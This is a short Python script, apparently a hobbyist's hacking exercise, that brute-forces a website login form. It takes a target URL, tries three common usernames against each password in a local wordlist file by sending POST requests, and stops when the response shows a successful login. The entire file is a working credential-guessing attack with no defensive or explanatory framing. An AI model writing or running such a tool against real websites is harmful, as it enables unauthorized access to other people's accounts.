import requests
import sys

target = input("website url:")
usernames= ["student","user","test",]
password = r'F:\htlm\Hacking python\top100.txt'
needle = "Logged In Successfully"

for username in usernames:
    with open( password, "r") as password_file:
        for password in password_file:
            password = password.strip()
            sys.stdout.write("[X] Attempting user:password -> {}:{}\r".format(username, password))
            sys.stdout.flush()
            r = requests.post(target, data={"username": username, "password": password})
            print(r.text)
            if needle in r.text:
                sys.stdout.write("\n")
                sys.stdout.write("\t[>>>>>] Valid password '{}' found for user '{}'!\n".format(password, username))
                sys.exit()
        sys.stdout.write("\n")
        sys.stdout.write("\t no password found for '{}'!\n".format(username))
